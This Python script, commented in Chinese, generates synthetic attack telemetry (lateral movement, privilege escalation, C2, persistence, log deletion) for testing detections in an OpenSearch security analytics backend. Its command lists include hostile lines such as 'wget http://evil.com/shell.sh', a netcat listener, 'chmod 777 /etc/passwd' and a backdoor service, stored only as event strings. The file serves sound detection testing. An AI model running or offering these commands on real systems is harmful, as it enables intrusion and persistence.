#!/usr/bin/env python3
"""
统一的数据生成脚本（合并了所有数据创建功能）

功能：
1. 生成大量测试events（包含横向移动、端口扫描、权限提升等）
2. 支持生成correlation测试数据
3. 优化的批量写入，避免OOM
4. 自动验证生成的数据

使用方法:
    # 生成200个events（默认）
    uv run python consolidated_data_generator.py
    
    # 生成指定数量的events
    uv run python consolidated_data_generator.py --count 500
    
    # 只生成横向移动数据
    uv run python consolidated_data_generator.py --type lateral-movement --count 100
    
    # 生成correlation测试数据
    uv run python consolidated_data_generator.py --correlation-test
"""

import sys
import uuid
import random
from pathlib import Path
from datetime import datetime, timedelta, timezone

backend_dir = Path(__file__).parent.parent.parent.parent.parent
sys.path.insert(0, str(backend_dir))

from app.services.opensearch.storage import store_events
from app.services.opensearch.index import initialize_indices
from app.services.opensearch.internal import get_client, get_index_name, INDEX_PATTERNS
from app.core.time import to_rfc3339

# 直接包含所有必要的函数和常量（从generate_test_events.py合并）

# 主机配置
HOSTS = [
    {"id": "host-100", "name": "host-100", "ip": "192.168.1.100"},
    {"id": "host-101", "name": "host-101", "ip": "192.168.1.101"},
    {"id": "host-102", "name": "host-102", "ip": "192.168.1.102"},
    {"id": "host-103", "name": "host-103", "ip": "192.168.1.103"},
    {"id": "host-104", "name": "host-104", "ip": "192.168.1.104"},
]

# 用户配置
USERS = ["admin", "user1", "user2", "root", "service"]

# 可疑进程
SUSPICIOUS_PROCESSES = [
    "nc", "netcat", "nmap", "masscan", "metasploit", "mimikatz",
    "powershell", "cmd.exe", "bash", "sh", "python", "perl"
]

# 可疑命令
SUSPICIOUS_COMMANDS = [
    "nc -l -p 4444", "nmap -sS 192.168.1.0/24", "wget http://evil.com/shell.sh",
    "curl http://evil.com/payload", "python -c 'import socket'",
    "chmod +x /tmp/backdoor", "chmod 777 /etc/passwd",
    "systemctl enable backdoor", "crontab -e", "at now + 1 minute"
]

# 敏感文件路径
SENSITIVE_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa", "/home/*/.ssh/authorized_keys", "/etc/crontab"
]


def create_base_event(
    event_id: str,
    timestamp: datetime,
    host: dict,
    user: str = None,
    event_category: list = None,
    event_type: list = None,
    event_action: str = None,
    dataset: str = None,
    message: str = None
) -> dict:
    """创建基础event结构"""
    timestamp_str = to_rfc3339(timestamp)
    
    # 根据category确定dataset
    # 注意：根据ECS规范，网络事件应使用netflow.*，而不是hostlog.network
    if not dataset:
        if event_category and "process" in event_category:
            dataset = "hostlog.process"
        elif event_category and "network" in event_category:
            # 根据ECS规范，网络事件使用netflow.flow
            dataset = "netflow.flow"
        elif event_category and "file" in event_category:
            dataset = "hostlog.file_registry"  # 使用规范中的名称
        elif event_category and "authentication" in event_category:
            dataset = "hostlog.auth"
        else:
            dataset = "hostlog.process"  # 默认
    
    event = {
        "ecs": {"version": "9.2.0"},
        "@timestamp": timestamp_str,
        "message": message or f"Event {event_id}",
        "event": {
            "id": event_id,
            "kind": "event",
            "category": event_category or ["process"],
            "type": event_type or ["start"],
            "action": event_action or "process_start",
            "dataset": dataset,
            "created": timestamp_str,
            "ingested": timestamp_str,
            "original": message or f"Event {event_id}"
        },
        "host": {
            "id": host["id"],
            "name": host["name"],
            "ip": host["ip"]  # 使用字符串而不是列表
        }
    }
    
    if user:
        event["user"] = {
            "id": f"user-{user}",
            "name": user
        }
    
    return event


def create_process_event(
    host: dict,
    user: str,
    process_name: str,
    command_line: str,
    timestamp: datetime,
    parent_name: str = None,
    pid: int = None
) -> dict:
    """创建进程事件"""
    event_id = f"event-proc-{uuid.uuid4().hex[:8]}"
    message = f"Process started: {process_name} - {command_line}"
    event = create_base_event(
        event_id, timestamp, host, user,
        event_category=["process"],
        event_type=["start"],
        event_action="process_start",
        dataset="hostlog.process",
        message=message
    )
    
    pid_val = pid or random.randint(1000, 9999)
    event["process"] = {
        "entity_id": f"proc-{uuid.uuid4().hex[:8]}",
        "pid": pid_val,
        "name": process_name,
        "command_line": command_line,
        "executable": f"/usr/bin/{process_name}" if not process_name.endswith('.exe') else f"C:\\Windows\\System32\\{process_name}"
    }
    
    if parent_name:
        event["process"]["parent"] = {
            "pid": random.randint(100, 999),
            "name": parent_name
        }
    
    return event


def create_network_event(
    host: dict,
    source_ip: str,
    dest_ip: str,
    dest_port: int,
    timestamp: datetime,
    direction: str = "outbound",
    protocol: str = "tcp"
) -> dict:
    """创建网络事件"""
    event_id = f"event-net-{uuid.uuid4().hex[:8]}"
    message = f"Network connection: {source_ip}:* -> {dest_ip}:{dest_port} ({protocol})"
    event = create_base_event(
        event_id, timestamp, host,
        event_category=["network"],
        event_type=["connection"],
        event_action="network_connection",
        dataset="netflow.flow",  # 使用规范中的dataset名称
        message=message
    )
    
    event["source"] = {"ip": source_ip}
    event["destination"] = {
        "ip": dest_ip,
        "port": dest_port
    }
    event["network"] = {
        "transport": protocol,
        "direction": direction
    }
    
    return event


def create_file_event(
    host: dict,
    user: str,
    file_path: str,
    action: str,
    timestamp: datetime
) -> dict:
    """创建文件事件"""
    event_id = f"event-file-{uuid.uuid4().hex[:8]}"
    message = f"File {action}: {file_path}"
    event = create_base_event(
        event_id, timestamp, host, user,
        event_category=["file"],
        event_type=["access"],
        event_action=f"file_{action}",
        dataset="hostlog.file_registry",  # 使用规范中的dataset名称
        message=message
    )
    
    event["file"] = {
        "path": file_path
    }
    
    return event


def create_dns_event(
    host: dict,
    query_name: str,
    timestamp: datetime
) -> dict:
    """创建DNS事件"""
    event_id = f"event-dns-{uuid.uuid4().hex[:8]}"
    message = f"DNS query: {query_name}"
    event = create_base_event(
        event_id, timestamp, host,
        event_category=["network"],
        event_type=["info"],
        event_action="dns_query",
        dataset="hostlog.dns",
        message=message
    )
    
    event["dns"] = {
        "question": {
            "name": query_name,
            "type": "A"
        }
    }
    
    return event


def create_authentication_event(
    host: dict,
    user: str,
    success: bool,
    timestamp: datetime,
    source_ip: str = None
) -> dict:
    """创建认证事件"""
    event_id = f"event-auth-{uuid.uuid4().hex[:8]}"
    outcome = "success" if success else "failure"
    message = f"User login {outcome}: {user} from {source_ip or 'local'}"
    event = create_base_event(
        event_id, timestamp, host, user,
        event_category=["authentication"],
        event_type=["start"],
        event_action="user_login",
        dataset="hostlog.auth",
        message=message
    )
    
    event["event"]["outcome"] = outcome
    
    if source_ip:
        event["source"] = {"ip": source_ip}
    
    return event


# 生成函数（从generate_test_events.py复制）
def generate_lateral_movement_events(base_time: datetime, count: int = 50) -> list:
    """生成横向移动事件"""
    events = []
    for i in range(count):
        host_a = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp_a = base_time + timedelta(seconds=i * 5)
        
        for j in range(random.randint(2, 4)):
            event1 = create_process_event(
                host_a, user, "sudo", f"sudo su - {random.choice(USERS)}",
                timestamp_a + timedelta(seconds=j), parent_name="bash"
            )
            events.append(event1)
        
        host_b = random.choice([h for h in HOSTS if h["id"] != host_a["id"]])
        timestamp_b = timestamp_a + timedelta(seconds=3)
        
        ports = [22, 3389, 445, 5985, 5986]
        for port in random.sample(ports, random.randint(2, 3)):
            event2 = create_network_event(
                host_a, host_a["ip"], host_b["ip"], port,
                timestamp_b + timedelta(seconds=random.randint(0, 2)),
                direction="outbound"
            )
            events.append(event2)
        
        timestamp_c = timestamp_b + timedelta(seconds=2)
        event3 = create_authentication_event(
            host_b, user, True, timestamp_c, source_ip=host_a["ip"]
        )
        events.append(event3)
        
        timestamp_d = timestamp_c + timedelta(seconds=1)
        for k in range(random.randint(3, 6)):
            parent_name = "sshd" if k == 0 else random.choice(SUSPICIOUS_PROCESSES)
            event4 = create_process_event(
                host_b, user, random.choice(SUSPICIOUS_PROCESSES),
                random.choice(SUSPICIOUS_COMMANDS),
                timestamp_d + timedelta(seconds=k),
                parent_name=parent_name,
                pid=random.randint(5000, 9999)
            )
            events.append(event4)
    return events


def generate_privilege_escalation_events(base_time: datetime, count: int = 30) -> list:
    """生成权限提升事件"""
    events = []
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 5)
        
        for j in range(random.randint(2, 4)):
            event1 = create_process_event(
                host, user, "sudo", f"sudo chmod 777 {random.choice(SENSITIVE_FILES)}",
                timestamp + timedelta(seconds=j), parent_name="bash"
            )
            events.append(event1)
        
        timestamp2 = timestamp + timedelta(seconds=3)
        # 生成Query 2匹配的文件访问事件（/etc/*, /usr/bin/*, /usr/sbin/*）
        query2_paths = [
            "/etc/passwd", "/etc/shadow", "/etc/sudoers",
            "/usr/bin/sudo", "/usr/bin/su",
            "/usr/sbin/useradd", "/usr/sbin/usermod"
        ]
        for file_path in random.sample(query2_paths, random.randint(2, 3)):
            event2 = create_file_event(
                host, user, file_path,
                "read", timestamp2 + timedelta(seconds=random.randint(0, 1))
            )
            events.append(event2)
        
        # 生成systemd/service进程，匹配Query 2
        timestamp2_5 = timestamp2 + timedelta(seconds=1)
        event2_5 = create_process_event(
            host, user, "systemd", "systemctl status sshd", timestamp2_5, parent_name="bash"
        )
        events.append(event2_5)
        
        timestamp3 = timestamp2 + timedelta(seconds=2)
        # Query 3匹配：file_modify事件
        event3 = create_file_event(host, user, "/etc/passwd", "modify", timestamp3)
        events.append(event3)
        
        # Query 3匹配：chmod/chown/sudo命令
        timestamp4 = timestamp3 + timedelta(seconds=1)
        for k in range(random.randint(2, 3)):
            cmd_choice = random.choice([
                f"chmod 777 {random.choice(SENSITIVE_FILES)}",
                f"chown root {random.choice(SENSITIVE_FILES)}",
                f"sudo {random.choice(SUSPICIOUS_COMMANDS)}"
            ])
            event4 = create_process_event(
                host, user, random.choice(["chmod", "chown", "sudo"]),
                cmd_choice,
                timestamp4 + timedelta(seconds=k),
                parent_name="bash"
            )
            events.append(event4)
    return events


def generate_port_scanning_events(base_time: datetime, count: int = 30) -> list:
    """生成端口扫描事件"""
    events = []
    attacker_host = random.choice(HOSTS)
    for i in range(count):
        target_host = random.choice([h for h in HOSTS if h["id"] != attacker_host["id"]])
        ports = [22, 80, 443, 445, 3389, 3306, 5432, 8080, 21, 25, 53, 110, 143, 993, 995, 23, 135, 139, 1433, 3306]
        for port in random.sample(ports, random.randint(8, 12)):
            timestamp = base_time + timedelta(seconds=i * 2 + random.randint(0, 1))
            event = create_network_event(
                attacker_host, attacker_host["ip"], target_host["ip"],
                port, timestamp, direction="outbound"
            )
            events.append(event)
    return events


def generate_data_exfiltration_events(base_time: datetime, count: int = 25) -> list:
    """生成数据泄露事件"""
    events = []
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 8)
        
        for file_path in random.sample(SENSITIVE_FILES, random.randint(2, 4)):
            event1 = create_file_event(
                host, user, file_path,
                "read", timestamp + timedelta(seconds=random.randint(0, 2))
            )
            events.append(event1)
        
        timestamp2 = timestamp + timedelta(seconds=3)
        for j in range(random.randint(2, 4)):
            external_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            ports = [443, 80, 8080, 8443]
            event2 = create_network_event(
                host, host["ip"], external_ip, random.choice(ports),
                timestamp2 + timedelta(seconds=j), direction="outbound"
            )
            events.append(event2)
    return events


def generate_persistence_events(base_time: datetime, count: int = 10) -> list:
    """生成持久化事件"""
    events = []
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 12)
        
        event1 = create_process_event(host, user, "crontab", "crontab -e", timestamp, parent_name="bash")
        events.append(event1)
        
        timestamp2 = timestamp + timedelta(seconds=2)
        event2 = create_file_event(host, user, "/etc/systemd/system/backdoor.service", "create", timestamp2)
        events.append(event2)
        
        timestamp3 = timestamp2 + timedelta(seconds=1)
        # 生成systemd相关进程，以便匹配Query 2
        event3 = create_process_event(host, user, "systemd", "systemctl enable backdoor.service", timestamp3, parent_name="bash")
        events.append(event3)
        
        # 也生成一个service进程
        event4 = create_process_event(host, user, "service", "service backdoor start", timestamp3 + timedelta(seconds=1), parent_name="bash")
        events.append(event4)
    return events


def generate_c2_events(base_time: datetime, count: int = 15) -> list:
    """生成命令与控制事件"""
    events = []
    for i in range(count):
        host = random.choice(HOSTS)
        timestamp = base_time + timedelta(seconds=i * 10)
        
        suspicious_domains = [
            "evil.com", "malware.net", "c2.example.com",
            "command-control.org", "backdoor.io", "suspicious-domain.com",
            "malicious-site.net", "phishing-domain.org", "trojan-host.com"
        ]
        for j in range(random.randint(2, 3)):
            event_dns = create_dns_event(host, random.choice(suspicious_domains), timestamp + timedelta(seconds=j))
            events.append(event_dns)
        
        timestamp2 = timestamp + timedelta(seconds=3)
        c2_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        event2 = create_network_event(host, host["ip"], c2_ip, 443, timestamp2, direction="outbound")
        events.append(event2)
    return events


def generate_defense_evasion_events(base_time: datetime, count: int = 10) -> list:
    """生成防御规避事件"""
    events = []
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 8)
        
        event1 = create_file_event(host, user, "/var/log/auth.log", "delete", timestamp)
        events.append(event1)
        
        timestamp2 = timestamp + timedelta(seconds=1)
        event2 = create_process_event(host, user, "kill", "kill -9 $(pgrep log)", timestamp2, parent_name="bash")
        events.append(event2)
    return events


def generate_misc_threat_events(base_time: datetime, count: int = 20) -> list:
    """生成其他威胁事件"""
    events = []
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 5)
        
        event_type = random.choice(["process", "network", "file", "dns"])
        
        if event_type == "process":
            event = create_process_event(
                host, user, random.choice(SUSPICIOUS_PROCESSES),
                random.choice(SUSPICIOUS_COMMANDS),
                timestamp, parent_name=random.choice(["bash", "sh", "python"])
            )
        elif event_type == "network":
            target_host = random.choice([h for h in HOSTS if h["id"] != host["id"]])
            event = create_network_event(
                host, host["ip"], target_host["ip"],
                random.randint(1, 65535), timestamp
            )
        elif event_type == "file":
            event = create_file_event(
                host, user, random.choice(SENSITIVE_FILES),
                random.choice(["read", "modify", "create"]),
                timestamp
            )
        else:  # dns
            event = create_dns_event(host, f"suspicious-{random.randint(1, 1000)}.com", timestamp)
        
        events.append(event)
    return events


def generate_correlation_test_data(base_time: datetime, count: int = 20) -> list:
    """
    生成correlation测试数据（横向移动攻击链）
    
    这是从create_correlation_test_data.py合并过来的功能
    """
    events = []
    
    for i in range(count):
        # 主机A的提权行为
        host_a = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp_a = base_time + timedelta(seconds=i * 10)
        
        # Query1: 主机A上的提权行为
        event1 = create_process_event(
            host_a, user, "sudo", f"sudo su - {random.choice(USERS)}",
            timestamp_a, parent_name="bash"
        )
        events.append(event1)
        
        # Query2: 从A到B的网络连接
        host_b = random.choice([h for h in HOSTS if h["id"] != host_a["id"]])
        timestamp_b = timestamp_a + timedelta(seconds=5)
        
        event2 = create_network_event(
            host_a, host_a["ip"], host_b["ip"], 22,
            timestamp_b, direction="outbound"
        )
        events.append(event2)
        
        # Query3: 主机B上的认证和可疑进程
        timestamp_c = timestamp_b + timedelta(seconds=2)
        event3 = create_authentication_event(
            host_b, user, True, timestamp_c, source_ip=host_a["ip"]
        )
        events.append(event3)
        
        # 主机B上的可疑进程
        timestamp_d = timestamp_c + timedelta(seconds=3)
        event4 = create_process_event(
            host_b, user, random.choice(SUSPICIOUS_PROCESSES),
            random.choice(SUSPICIOUS_COMMANDS),
            timestamp_d, parent_name="sshd"
        )
        events.append(event4)
    
    return events


def store_events_safely(events: list, batch_size: int = 300):
    """
    安全的批量写入（避免OOM）
    """
    if len(events) <= batch_size:
        # 少量数据直接写入
        return store_events(events)
    
    # 大量数据分批写入
    print(f"\n[INFO] Events数量较多（{len(events)}），使用分批写入（每批{batch_size}个）...")
    
    total_success = 0
    total_failed = 0
    
    for i in range(0, len(events), batch_size):
        batch = events[i:i + batch_size]
        batch_num = (i // batch_size) + 1
        total_batches = (len(events) + batch_size - 1) // batch_size
        
        print(f"  批次 {batch_num}/{total_batches}: {len(batch)} 个events")
        
        try:
            result = store_events(batch)
            batch_success = result.get('success', 0)
            batch_failed = result.get('failed', 0)
            
            total_success += batch_success
            total_failed += batch_failed
            
            # 每批之间稍作延迟
            if i + batch_size < len(events):
                import time
                time.sleep(0.3)
        except Exception as e:
            print(f"    [ERROR] 批次 {batch_num} 写入失败: {e}")
            total_failed += len(batch)
    
    # 最后refresh一次
    if total_success > 0:
        try:
            from app.services.opensearch.index import get_index_name, INDEX_PATTERNS
            from app.services.opensearch.client import refresh_index
            today = datetime.now(timezone.utc)
            idx = get_index_name(INDEX_PATTERNS['ECS_EVENTS'], today)
            refresh_index(idx)
            print(f"\n[OK] 索引已refresh")
        except Exception as e:
            print(f"\n[WARNING] Refresh失败: {e}")
    
    return {
        "success": total_success,
        "failed": total_failed,
        "total": len(events)
    }


def verify_generated_data():
    """验证生成的数据"""
    client = get_client()
    today = datetime.now(timezone.utc)
    idx = get_index_name(INDEX_PATTERNS['ECS_EVENTS'], today)
    
    try:
        resp = client.count(index=idx)
        count = resp.get('count', 0)
        
        print("\n" + "=" * 80)
        print("数据验证")
        print("=" * 80)
        print(f"索引: {idx}")
        print(f"Events总数: {count}")
        
        if count >= 100:
            print(f"\n[OK] 成功生成 {count} 个events")
        else:
            print(f"\n[WARNING] 只有 {count} 个events")
        
        # 检查events分布
        resp = client.search(index=idx, body={
            'size': 0,
            'aggs': {
                'by_dataset': {
                    'terms': {'field': 'event.dataset.keyword', 'size': 10}
                }
            }
        })
        
        buckets = resp.get('aggregations', {}).get('by_dataset', {}).get('buckets', [])
        if buckets:
            print("\n按dataset分布:")
            for b in buckets:
                print(f"  {b['key']}: {b['doc_count']} 个")
        
    except Exception as e:
        print(f"\n[WARNING] 验证失败: {e}")


def main():
    """主函数"""
    import argparse
    
    parser = argparse.ArgumentParser(description="统一的数据生成脚本")
    parser.add_argument(
        "--count",
        type=int,
        default=200,
        help="要生成的events数量（默认: 200）"
    )
    parser.add_argument(
        "--type",
        type=str,
        choices=['lateral-movement', 'port-scanning', 'privilege-escalation', 'all'],
        default='all',
        help="生成特定类型的events（默认: all）"
    )
    parser.add_argument(
        "--correlation-test",
        action="store_true",
        help="生成correlation测试数据（横向移动攻击链）"
    )
    parser.add_argument(
        "--base-time",
        type=str,
        default=None,
        help="基准时间（ISO格式，默认: 当前时间-1小时）"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        default=True,
        help="生成后验证数据（默认: True）"
    )
    
    args = parser.parse_args()
    
    print("=" * 80)
    print("统一数据生成脚本")
    print("=" * 80)
    
    # 初始化索引
    print("\n[1] 初始化索引...")
    initialize_indices()
    
    # 设置基准时间
    # 重要：使用当前时间或最近的时间，确保events在correlation查询的时间范围内
    # correlation查询默认使用最近30分钟的数据，所以events应该在最近30分钟内
    if args.base_time:
        base_time = datetime.fromisoformat(args.base_time.replace('Z', '+00:00'))
    else:
        # 使用当前时间往前推5分钟（确保在30分钟窗口内）
        base_time = datetime.now(timezone.utc) - timedelta(minutes=5)
    
    print(f"\n[2] 基准时间: {base_time.isoformat()}")
    print(f"[3] 目标数量: {args.count} 个events")
    
    # 生成events
    print("\n[4] 生成events...")
    all_events = []
    
    if args.correlation_test:
        # 生成correlation测试数据
        print(f"  生成correlation测试数据: {args.count} 个场景")
        all_events.extend(generate_correlation_test_data(base_time, args.count))
    elif args.type == 'lateral-movement':
        # 横向移动：每个场景平均生成约11个事件（2-4个process + 2-3个network + 1个auth + 3-6个process）
        avg_events_per_scenario = 11
        scenario_count = max(1, args.count // avg_events_per_scenario)
        print(f"  横向移动: {scenario_count} 个场景（目标: {args.count} 个事件）")
        all_events.extend(generate_lateral_movement_events(base_time, scenario_count))
        # 如果生成的事件太多，截断到目标数量
        if len(all_events) > args.count:
            all_events = all_events[:args.count]
            print(f"  [INFO] 已截断到 {len(all_events)} 个事件")
    elif args.type == 'port-scanning':
        # 端口扫描：每个场景平均生成约5个事件（1个process + 3-5个network）
        avg_events_per_scenario = 5
        scenario_count = max(1, args.count // avg_events_per_scenario)
        print(f"  端口扫描: {scenario_count} 个场景（目标: {args.count} 个事件）")
        all_events.extend(generate_port_scanning_events(base_time, scenario_count))
        # 如果生成的事件太多，截断到目标数量
        if len(all_events) > args.count:
            all_events = all_events[:args.count]
            print(f"  [INFO] 已截断到 {len(all_events)} 个事件")
    elif args.type == 'privilege-escalation':
        # 权限提升：每个场景平均生成约8个事件（2-4个process + 2-3个file + 1个file + 2-3个process）
        avg_events_per_scenario = 8
        scenario_count = max(1, args.count // avg_events_per_scenario)
        print(f"  权限提升: {scenario_count} 个场景（目标: {args.count} 个事件）")
        all_events.extend(generate_privilege_escalation_events(base_time, scenario_count))
        # 如果生成的事件太多，截断到目标数量
        if len(all_events) > args.count:
            all_events = all_events[:args.count]
            print(f"  [INFO] 已截断到 {len(all_events)} 个事件")
    else:
        # 生成所有类型
        # 注意：每个场景会生成多个事件（平均约10个），所以场景数 = count / 10
        # 但为了确保有足够的数据，设置最小场景数
        avg_events_per_scenario = 10  # 平均每个场景生成的事件数
        total_scenarios = max(args.count // avg_events_per_scenario, 10)  # 至少10个场景
        
        # 8种类型：横向移动、权限提升、端口扫描各占2倍权重，其他5种各占1倍权重
        # 总权重 = 2 + 2 + 2 + 1 + 1 + 1 + 1 + 1 = 11
        weight_total = 11
        per_type_base = max(1, total_scenarios // weight_total)  # 每种基础类型至少1个场景
        
        lateral_count = per_type_base * 2
        port_scan_count = per_type_base * 2
        privilege_count = per_type_base * 2
        other_count = per_type_base
        
        print(f"  横向移动: {lateral_count} 个场景")
        all_events.extend(generate_lateral_movement_events(base_time, lateral_count))
        
        print(f"  权限提升: {privilege_count} 个场景")
        all_events.extend(generate_privilege_escalation_events(base_time, privilege_count))
        
        print(f"  端口扫描: {port_scan_count} 个场景")
        all_events.extend(generate_port_scanning_events(base_time, port_scan_count))
        
        print(f"  数据泄露: {other_count} 个场景")
        all_events.extend(generate_data_exfiltration_events(base_time, other_count))
        
        print(f"  持久化: {other_count} 个场景")
        all_events.extend(generate_persistence_events(base_time, other_count))
        
        print(f"  命令与控制: {other_count} 个场景")
        all_events.extend(generate_c2_events(base_time, other_count))
        
        print(f"  防御规避: {other_count} 个场景")
        all_events.extend(generate_defense_evasion_events(base_time, other_count))
        
        print(f"  其他威胁: {other_count} 个场景")
        all_events.extend(generate_misc_threat_events(base_time, other_count))
        
        print(f"\n[INFO] 预计生成约 {len(all_events)} 个事件（目标: {args.count} 个）")
    
    print(f"\n[5] 总共生成了 {len(all_events)} 个events")
    
    # 写入OpenSearch
    print("\n[6] 写入OpenSearch...")
    result = store_events_safely(all_events, batch_size=300)
    
    print("\n" + "=" * 80)
    print("完成")
    print("=" * 80)
    print(f"  总数: {result.get('total', 0)}")
    print(f"  成功: {result.get('success', 0)}")
    print(f"  失败: {result.get('failed', 0)}")
    
    # 验证
    if args.verify:
        verify_generated_data()
    
    print("\n[INFO] 现在可以运行 Security Analytics 检测来生成findings")


if __name__ == "__main__":
    main()
